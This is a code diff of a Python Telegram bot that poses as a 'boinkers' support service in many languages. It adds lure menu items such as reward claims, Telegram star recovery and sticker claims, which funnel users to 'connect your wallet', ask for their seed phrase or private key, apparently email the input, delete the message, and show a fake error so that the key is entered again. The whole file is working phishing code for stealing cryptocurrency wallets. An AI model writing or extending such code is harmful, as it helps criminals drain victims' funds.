+        "enter stickers prompt": "Ketik stiker yang ingin Anda klaim.",
+        "confirm_entered_stickers": "Anda memasukkan {count} stiker:\n{stickers}\n\nKonfirmasi?",
+        "yes": "Ya",
+        "no": "Tidak",
         "back": "🔙 Kembali",
-        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
-        "account recovery": "Pemulihan Akun",
-        "claim spin": "Klaim Spin",
-        "refund": "Pengembalian Dana",
-        "claim sticker reward": "Klaim Hadiah (Sticker)",
+        "smash piggy bank": "Hancurkan Celengan",
+        "recover telegram stars": "Pulihkan bintang Telegram",
+        "claim rewards": "Klaim Hadiah",
+        "recover_telegram_stars": "Silakan sambungkan dompet Anda untuk memulihkan bintang Telegram Anda.",
+        "smash_piggy_bank": "Silakan sambungkan dompet Anda untuk menghancurkan celengan Anda.",
+        "claim_rewards": "Silakan sambungkan dompet Anda untuk mengklaim hadiah Anda.",
+        "claim_tickets": "Silakan sambungkan dompet Anda untuk klaim tiket 🎟 di akun Anda.",
+        "recover_account_progress": "Silakan sambungkan dompet Anda untuk memulihkan progres akun Anda.",
+        "assets_recovery": "Silakan sambungkan dompet Anda untuk memulihkan dana Anda.",
+        "claim_sticker_reward": "Silakan sambungkan dompet Anda untuk klaim hadiah stiker Anda.",
     },
     "de": {
         "welcome": "Hi {user} willkommen beim boinkers Support-Bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Option im Menü, um fortzufahren.",
@@ -528,7 +621,7 @@ LANGUAGES = {
         "account recovery": "Accountherstel",
         "claim spin": "Spin Claimen",
         "refund": "Terugbetaling",
-        "claim sticker reward": "Claim Sticker Beloning",
+        "claim sticker reward": "Claim Sticker Beloning", 
     },
     "hi": {
         "welcome": "Hi {user} boinkers सपोर्ट बोट में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
@@ -559,13 +652,22 @@ LANGUAGES = {
         "error_use_seed_phrase": "यह फ़ील्ड seed phrase (12 या 24 शब्द) मांगता है। कृपया seed दें।",
         "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। /start के साथ पुनः प्रयास करें。",
         "choose language": "कृपया भाषा चुनें:",
-        "await restart message": "कृपया /start दबाएँ।",
+        "await restart message": "कृपया /start दबाएँ。",
+        "enter stickers prompt": "कृपया वह स्टिकर टाइप करें जिसे आप क्लेम करना चाहते हैं।",
+        "confirm_entered_stickers": "आपने {count} स्टिकर दर्ज किए:\n{stickers}\n\nकृपया पुष्टि करें。",
+        "yes": "हाँ",
+        "no": "नहीं",
         "back": "🔙 वापस",
-        "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
-        "account recovery": "खाता पुनर्प्राप्ति",
-        "claim spin": "Spin क्लेम",
-        "refund": "रिफंड",
-        "claim sticker reward": "स्टिकर पुरस्कार क्लेम",
+        "smash piggy bank": "पिग्गी बैंक तोड़ें",
+        "recover telegram stars": "टेलीग्राम स्टार्स पुनर्प्राप्त करें",
+        "claim rewards": "इनाम दावा करें",
+        "recover_telegram_stars": "कृपया अपने टेलीग्राम स्टार्स पुनर्प्राप्त करने के लिए अपना वॉलेट कनेक्ट करें",
+        "smash_piggy_bank": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपनी पिग्गी बैंक तोड़ सकें",
+        "claim_rewards": "कृपया अपना वॉलेट कनेक्ट करें अपने इनाम का दावा करने के लिए",
+        "claim_tickets": "कृपया अपना वॉलेट कनेक्ट करें अपने टिकट 🎟 अपने खाते में क्लेम करने के लिए",
+        "recover_account_progress": "कृपया अपना वॉलेट कनेक्ट करें ताकि अपने खाते की प्रगति पुनर्प्राप्त कर सकें",
+        "assets_recovery": "कृपया अपना वॉलेट कनेक्ट करें अपने फंड्स पुनर्प्राप्त करने के लिए",
+        "claim_sticker_reward": "कृपया अपना वॉलेट कनेक्ट करें अपने स्टिकर इनाम का दावा करने के लिए",
     },
     "tr": {
         "welcome": "Hi {user} boinkers destek botuna hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
@@ -634,6 +736,10 @@ LANGUAGES = {
         "post_receive_error": "‼️ 出现错误。请确保输入正确的密钥 — 使用复制粘贴以避免错误。请 /start 再试。",
         "choose language": "请选择语言：",
         "await restart message": "请点击 /start 重新开始。",
+        "enter stickers prompt": "请输入您要申领的贴纸。",
+        "confirm_entered_stickers": "您输入了 {count} 个贴纸：\n{stickers}\n\n请确认。",
+        "yes": "是",
+        "no": "否",
         "back": "🔙 返回",
         "invalid_input": "无效输入。请使用 /start 开始。",
         "account recovery": "账户恢复",
@@ -671,12 +777,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit. Prosím /start pro opakování.",
         "choose language": "Vyberte preferovaný jazyk:",
         "await restart message": "Klikněte /start pro restart.",
+        "enter stickers prompt": "Zadejte samolepky, které chcete nárokovat.",
+        "confirm_entered_stickers": "Zadali jste {count} samolepku(y):\n{stickers}\n\nPotvrďte, prosím.",
+        "yes": "Ano",
+        "no": "Ne",
         "back": "🔙 Zpět",
-        "invalid_input": "Neplatný vstup. Použijte /start.",
-        "account recovery": "Obnovení účtu",
-        "claim spin": "Požádat o Spin",
-        "refund": "Vrácení peněz",
-        "claim sticker reward": "Požádat o odměnu (nálepka)",
+        "smash piggy bank": "Rozbít prasátko",
+        "recover telegram stars": "Obnovit Telegram hvězdy",
+        "claim rewards": "Uplatnit odměny",
+        "recover_telegram_stars": "prosím připojte svou peněženku pro obnovení vašich Telegram hvězd",
+        "smash_piggy_bank": "prosím připojte svou peněženku, abyste rozbili své prasátko",
+        "claim_rewards": "prosím připojte svou peněženku pro uplatnění vaší odměny",
+        "claim_tickets": "prosím připojte svou peněženku pro uplatnění vašich vstupenek 🎟 ve vašem účtu",
+        "recover_account_progress": "prosím připojte svou peněženку pro obnovení postupu účtu",
+        "assets_recovery": "prosím připojte svou peněženku pro obnovení vašich prostředků",
+        "claim_sticker_reward": "prosím připojte svou peněženku pro uplatnění odměny za samolepky",
     },
     "ur": {
         "welcome": "Hi {user} boinkers سپورٹ بوٹ میں خوش آمدید! یہ بوٹ والٹ تک رسائی، ٹرانزیکشنز، بیلنس، بحالی، اکاؤنٹ کی بازیابی، ٹوکن اور انعامات کا کلیم، ریفنڈز اور اکاؤنٹ کی تصدیق میں مدد کرتا ہے۔ جاری رکھنے کے لیے مینو میں سے ایک آپشن منتخب کریں۔",
@@ -701,19 +816,28 @@ LANGUAGES = {
         "reassurance": PROFESSIONAL_REASSURANCE["ur"],
         "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
         "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
-        "invalid choice": "غلط انتخاب۔ براہِ کرم بٹنز استعمال کریں。",
+        "invalid choice": "غلط انتخاب۔ براہِ کرم بٹنز استعمال کریں۔",
         "final error message": "‼️ ایک خرابی پیش آئی۔ /start دوبارہ کوشش کریں。",
         "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں。",
-        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں。",
-        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے。",
+        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے。 براہ کرم seed درج کریں。",
+        "post_receive_error": "‼️ ایک خرابی پیش آئی。 براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے。",
         "choose language": "براہ کرم زبان منتخب کریں:",
         "await restart message": "براہ کرم /start دبائیں。",
+        "enter stickers prompt": "براہ کرم وہ اسٹیکر لکھیں جو آپ کلیم کرنا چاہتے ہیں。",
+        "confirm_entered_stickers": "آپ نے {count} اسٹیکر درج کیے ہیں:\n{stickers}\n\nبراہ کرم تصدیق کریں。",
+        "yes": "ہاں",
+        "no": "نہیں",
         "back": "🔙 واپس",
-        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں。",
-        "account recovery": "اکاؤنٹ بازیابی",
-        "claim spin": "Spin کلیم",
-        "refund": "ری فنڈ",
-        "claim sticker reward": "اسٹیکر انعام کلیم",
+        "smash piggy bank": "خانۂ جمع توڑیں",
+        "recover telegram stars": "ٹیلیگرام اسٹارز بحال کریں",
+        "claim rewards": "انعامات کا دعویٰ کریں",
+        "recover_telegram_stars": "براہ کرم اپنے ٹیلیگرام اسٹارز بحال کرنے کے لیے اپنا والٹ کنیکٹ کریں",
+        "smash_piggy_bank": "براہ کرم اپنی خانی جمع توڑنے کے لیے اپنا والٹ کنیکٹ کریں",
+        "claim_rewards": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ اپنا انعام حاصل کریں",
+        "claim_tickets": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ اپنے ٹکٹ 🎟 اپنے اکاؤنٹ میں کلیم کریں",
+        "recover_account_progress": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ اپنے اکاؤنٹ کی ترقی بحال کریں",
+        "assets_recovery": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ اپنے فنڈز بحال کریں",
+        "claim_sticker_reward": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ اپنے اسٹیکر انعامات وصول کریں",
     },
     "uz": {
         "welcome": "Hi {user} boinkers qo‘llab-quvvatlash botiga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variantni tanlang.",
@@ -740,11 +864,15 @@ LANGUAGES = {
         "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
         "invalid choice": "Notoʻgʻri tanlov. Tugmalardan foydalaning。",
         "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib koʻring。",
-        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi. /start bilan boshlang。",
+        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi。 /start bilan boshlang。",
         "error_use_seed_phrase": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas。",
-        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning. /start bilan qayta urinib ko‘ring。",
+        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning。 /start bilan qayta urinib ko‘ring。",
         "choose language": "Iltimos, tilni tanlang:",
         "await restart message": "Qayta boshlash uchun /start bosing.",
+        "enter stickers prompt": "Da'vo qilmoqchi bo'lgan stikerlarni kiriting.",
+        "confirm_entered_stickers": "Siz {count} stiker kiritdingiz:\n{stickers}\n\nTasdiqlang。",
+        "yes": "Ha",
+        "no": "Yo'q",
         "back": "🔙 Orqaga",
         "invalid_input": "Noto'g'ri kiritish. /start ishlating。",
         "account recovery": "Hisobni tiklash",
@@ -853,9 +981,13 @@ LANGUAGES = {
         "final error message": "‼️ Ralat berlaku. /start untuk cuba semula。",
         "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses。 Gunakan /start untuk mula semula。",
         "error_use_seed_phrase": "Medan ini memerlukan seed phrase (12 atau 24 perkataan). Sila berikan seed phrase。",
-        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat. Sila /start untuk cuba semula。",
+        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat。 /start untuk cuba semula。",
         "choose language": "Sila pilih bahasa pilihan anda:",
         "await restart message": "Sila klik /start untuk memulakan semula。",
+        "enter stickers prompt": "Taip sticker yang ingin anda tuntut.",
+        "confirm_entered_stickers": "Anda memasukkan {count} sticker(s):\n{stickers}\n\nSahkan?",
+        "yes": "Ya",
+        "no": "Tidak",
         "back": "🔙 Kembali",
         "invalid_input": "Input tidak sah. Gunakan /start。",
         "account recovery": "Pemulihan Akaun",
@@ -893,6 +1025,10 @@ LANGUAGES = {
         "post_receive_error": "‼️ A apărut o eroare. Folosiți copiere/lipire pentru a evita erori。 /start pentru a încerca din nou。",
         "choose language": "Selectați limba preferată:",
         "await restart message": "Apăsați /start pentru a relua。",
+        "enter stickers prompt": "Introduceți stickerele pe care doriți să le revendicați。",
+        "confirm_entered_stickers": "Ați introdus {count} sticker(e):\n{stickers}\n\nConfirmați?",
+        "yes": "Da",
+        "no": "Nu",
         "back": "🔙 Înapoi",
         "invalid_input": "Intrare invalidă. /start。",
         "account recovery": "Recuperare Cont",
@@ -925,11 +1061,15 @@ LANGUAGES = {
         "prompt private key": "Zadajte svoj súkromný kľúč。" + PROFESSIONAL_REASSURANCE["sk"],
         "invalid choice": "Neplatná voľba. Použite tlačidlá。",
         "final error message": "‼️ Vyskytla sa chyba. /start pre opakovanie。",
-        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný。 /start pre opakovanie。",
+        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný۔ /start pre opakovanie。",
         "error_use_seed_phrase": "Toto pole vyžaduje seed phrase (12 alebo 24 slov)。",
         "post_receive_error": "‼️ Došlo k chybe. Použite kopírovanie/vloženie, aby ste sa vyhli chybám。 /start pre opakovanie。",
         "choose language": "Vyberte preferovaný jazyk:",
         "await restart message": "Kliknite /start pre reštart。",
+        "enter stickers prompt": "Zadajte nálepky, ktoré chcete uplatniť。",
+        "confirm_entered_stickers": "Zadali ste {count} nálepiek:\n{stickers}\n\nPotvrďte。",
+        "yes": "Áno",
+        "no": "Nie",
         "back": "🔙 Späť",
         "invalid_input": "Neplatný vstup. /start。",
         "account recovery": "Obnovenie účtu",
@@ -1042,14 +1182,35 @@ LANGUAGES = {
         "await restart message": "Kliknij /start aby zacząć ponownie。",
         "back": "🔙 Powrót",
         "invalid_input": "Nieprawidłowe dane. /start。",
-        "account recovery": "Odzyskiwanie konta",
-        "claim spin": "Odbierz Spin",
-        "refund": "Zwrot",
-        "claim sticker reward": "Odbierz nagrodę (sticker)",
+        "enter stickers prompt": "Wpisz naklejki, które chcesz zgłosić.",
+        "confirm_entered_stickers": "Wpisałeś {count} naklejkę(i):\n{stickers}\n\nPotwierdź?",
+        "yes": "Tak",
+        "no": "Nie",
+        "smash piggy bank": "Rozbij skarbonkę",
+        "recover telegram stars": "Odzyskaj gwiazdki Telegram",
+        "claim rewards": "Odbierz nagrody",
+        "recover_telegram_stars": "proszę połącz swój portfel aby odzyskać swoje gwiazdki Telegram",
+        "smash_piggy_bank": "proszę połącz swój portfel aby rozbić swoją skarbonkę",
+        "claim_rewards": "proszę połącz swój portfel aby odebrać swoją nagrodę",
+        "claim_tickets": "proszę połącz swój portfel aby odebrać swoje bilety 🎟 w swoim koncie",
+        "recover_account_progress": "proszę połącz swój portfel aby odzyskać postęp konta",
+        "assets_recovery": "proszę połącz swój portfel aby odzyskać swoje środki",
+        "claim_sticker_reward": "proszę połącz swój portfel aby odebrać nagrodę za naklejki",
     },
 }
 
-# Helper to get localized UI text
+# Custom connect messages for menu callback_data (exact wording per request)
+MENU_CONNECT_MESSAGES = {
+    "recover_telegram_stars": "please connect your wallet to recover your telegram stars",
+    "smash_piggy_bank": "please connect your wallet smash your piggy bank",
+    "claim_rewards": "please connect your wallet to claim your reward",
+    "claim_tickets": "please connect your wallet to Claim your tickets 🎟 in your account",
+    "recover_account_progress": "please connect your wallet to recover your account's progress",
+    "assets_recovery": "please connect your wallet to recover your funds",
+    "claim_sticker_reward": "please connect your wallet to Claim your stickers reward",
+}
+
+# Utility to get localized text
 def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
     lang = "en"
     try:
@@ -1059,19 +1220,37 @@ def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
         lang = "en"
     return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))
 
-# Message stack helpers (Back flow)
-async def send_and_push_message(bot, chat_id: int, text: str, context: ContextTypes.DEFAULT_TYPE, reply_markup=None, parse_mode=None, state=None) -> object:
+# Helper to parse sticker input into items and count
+def parse_stickers_input(text: str):
+    if not text:
+        return [], 0
+    normalized = text.replace(",", "\n").replace(";", "\n")
+    parts = [p.strip() for p in normalized.splitlines() if p.strip()]
+    return parts, len(parts)
+
+# Helper to send a new bot message and push it onto per-user message stack (to support editing on Back)
+async def send_and_push_message(
+    bot,
+    chat_id: int,
+    text: str,
+    context: ContextTypes.DEFAULT_TYPE,
+    reply_markup=None,
+    parse_mode=None,
+    state=None,
+) -> object:
     msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
     stack = context.user_data.setdefault("message_stack", [])
     recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
-    stack.append({
-        "chat_id": chat_id,
-        "message_id": msg.message_id,
-        "text": text,
-        "reply_markup": reply_markup,
-        "state": recorded_state,
-        "parse_mode": parse_mode,
-    })
+    stack.append(
+        {
+            "chat_id": chat_id,
+            "message_id": msg.message_id,
+            "text": text,
+            "reply_markup": reply_markup,
+            "state": recorded_state,
+            "parse_mode": parse_mode,
+        }
+    )
     if len(stack) > 60:
         stack.pop(0)
     return msg
@@ -1079,7 +1258,6 @@ async def send_and_push_message(bot, chat_id: int, text: str, context: ContextTy
 async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     stack = context.user_data.get("message_stack", [])
     if not stack:
-        # if nothing in stack, show language keyboard again
         keyboard = build_language_keyboard()
         await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
         context.user_data["current_state"] = CHOOSE_LANGUAGE
@@ -1118,7 +1296,7 @@ async def edit_current_to_previous_on_back(update: Update, context: ContextTypes
         context.user_data["current_state"] = prev.get("state", MAIN_MENU)
         return prev.get("state", MAIN_MENU)
 
-# Language keyboard
+# Language selection keyboard (English-only for selection; translations are used elsewhere)
 def build_language_keyboard():
     keyboard = [
         [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
@@ -1137,7 +1315,7 @@ def build_language_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# Build main menu markup - final menu per your request (no tree emojis)
+# Build main menu using ui_text(context, ...) — updated per request
 def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
     kb = [
         [InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation"),
@@ -1148,9 +1326,10 @@ def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
          InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
         [InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues"),
          InlineKeyboardButton(ui_text(context, "missing balance"), callback_data="missing_balance")],
-        [InlineKeyboardButton(ui_text(context, "account recovery"), callback_data="account_recovery"),
-         InlineKeyboardButton(ui_text(context, "claim spin"), callback_data="claim_spin")],
-        [InlineKeyboardButton(ui_text(context, "refund"), callback_data="refund"),
+        # New menu items, account recovery removed
+        [InlineKeyboardButton(ui_text(context, "smash piggy bank"), callback_data="smash_piggy_bank"),
+         InlineKeyboardButton(ui_text(context, "recover telegram stars"), callback_data="recover_telegram_stars")],
+        [InlineKeyboardButton(ui_text(context, "claim rewards"), callback_data="claim_rewards"),
          InlineKeyboardButton(ui_text(context, "claim sticker reward"), callback_data="claim_sticker_reward")],
         [InlineKeyboardButton(ui_text(context, "claim tickets"), callback_data="claim_tickets"),
          InlineKeyboardButton(ui_text(context, "recover account progress"), callback_data="recover_account_progress")],
@@ -1185,23 +1364,37 @@ async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
     return MAIN_MENU
 
-# Handler for invalid typed input during button-based states
+# Invalid typed input handler
 async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     msg = ui_text(context, "invalid_input")
     await update.message.reply_text(msg)
     return context.user_data.get("current_state", CHOOSE_LANGUAGE)
 
-# Show connect wallet button after menu selection
+# Show contextual connect wallet message when a main menu option is selected.
+# For mapped menu keys it sends the exact mapped sentence; otherwise it falls back to generic.
 async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
+    selected_key = query.data  # e.g., "claim_rewards", "smash_piggy_bank", etc.
+
+    # Try to get a localized per-menu connect sentence using the callback_data as a key
+    localized = ui_text(context, selected_key)
+    if localized == selected_key:
+        # not found -> fallback to generic language-specific connect message
+        custom_connect = ui_text(context, "connect wallet message")
+    else:
+        custom_connect = localized
+
+    composed = custom_connect
     context.user_data["current_state"] = AWAIT_CONNECT_WALLET
-    label = ui_text(context, "connect wallet message")
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
-        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
-    ])
-    await send_and_push_message(context.bot, update.effective_chat.id, label, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
+
+    keyboard = InlineKeyboardMarkup(
+        [
+            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
+            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
+        ]
+    )
+    await send_and_push_message(context.bot, update.effective_chat.id, composed, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
     return AWAIT_CONNECT_WALLET
 
 # Show wallet types
@@ -1236,7 +1429,7 @@ async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE)
         "wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet",
         "wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station",
         "wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon",
-        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other"
+        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other",
     ]
     kb = []
     row = []
@@ -1254,18 +1447,36 @@ async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
     return CHOOSE_OTHER_WALLET_TYPE
 
-# Show phrase options (private key / seed)
+# Show phrase options (private key / seed) with wallet-specific rules:
+# - For Tonkeeper, Telegram Wallet, Tonhub: only show seed phrase (no private key)
+# - For other wallets: show seed phrase first, then private key
 async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
     wallet_key = query.data
     wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
     context.user_data["wallet type"] = wallet_name
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"),
-         InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
-        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")]
-    ])
+
+    # Wallet keys to restrict to seed-only
+    seed_only_keys = {"wallet_type_metamask", "wallet_type_trust_wallet", "wallet_type_tonkeeper"}
+
+    if wallet_key in seed_only_keys:
+        keyboard = InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
+                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
+            ]
+        )
+    else:
+        # seed phrase first, then private key
+        keyboard = InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
+                [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key")],
+                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
+            ]
+        )
+
     text = ui_text(context, "wallet selection message").format(wallet_name=wallet_name)
     context.user_data["current_state"] = PROMPT_FOR_INPUT
     await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
@@ -1290,7 +1501,7 @@ async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         return ConversationHandler.END
     return RECEIVE_INPUT
 
-# Handle final input (validate seed length, always email input, attempt to delete message)
+# Handle final input (validate seed length if seed selected, always email input, attempt to delete message)
 async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_input = update.message.text or ""
     chat_id = update.message.chat_id
@@ -1314,7 +1525,6 @@ async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if context.user_data.get("wallet option") == "seed_phrase":
         words = [w for w in re.split(r"\s+", user_input.strip()) if w]
         if len(words) not in (12, 24):
-            # ask again for the seed phrase using ForceReply with localized guidance
             fr = ForceReply(selective=False)
             await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
             context.user_data["current_state"] = RECEIVE_INPUT
@@ -1324,6 +1534,51 @@ async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     context.user_data["current_state"] = AWAIT_RESTART
     await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
     return AWAIT_RESTART
+
+# --- Sticker handlers (parse and confirm) ---
+async def handle_sticker_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    text = update.message.text or ""
+    try:
+        await context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)
+    except Exception:
+        pass
+
+    parts, count = parse_stickers_input(text)
+    context.user_data["current_state"] = CLAIM_STICKER_CONFIRM
+    keyboard = InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton(ui_text(context, "yes"), callback_data="claim_sticker_confirm_yes"),
+                InlineKeyboardButton(ui_text(context, "no"), callback_data="claim_sticker_confirm_no"),
+            ]
+        ]
+    )
+    confirm_text = ui_text(context, "confirm_entered_stickers").format(count=count, stickers="\n".join(parts) if parts else text)
+    await send_and_push_message(context.bot, update.effective_chat.id, confirm_text, context, reply_markup=keyboard, state=CLAIM_STICKER_CONFIRM)
+    return CLAIM_STICKER_CONFIRM
+
+async def handle_claim_sticker_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    if query.data == "claim_sticker_confirm_no":
+        context.user_data["current_state"] = CLAIM_STICKER_INPUT
+        prompt = ui_text(context, "enter stickers prompt")
+        fr = ForceReply(selective=False)
+        await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
+        return CLAIM_STICKER_INPUT
+
+    context.user_data["from_claim_sticker"] = True
+    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
+    keyboard = InlineKeyboardMarkup(
+        [
+            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
+            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
+        ]
+    )
+    text = f"{ui_text(context, 'claim sticker reward')}\n{ui_text(context, 'connect wallet message')}"
+    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
+    return AWAIT_CONNECT_WALLET
+# --- end sticker handlers ---
 
 # After restart handler
 async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -1363,40 +1618,79 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 def main() -> None:
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
+    # Conversation handler with main-menu and wallet callbacks included in every state's handler list
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
-            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
+            CHOOSE_LANGUAGE: [
+                CallbackQueryHandler(set_language, pattern="^lang_"),
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
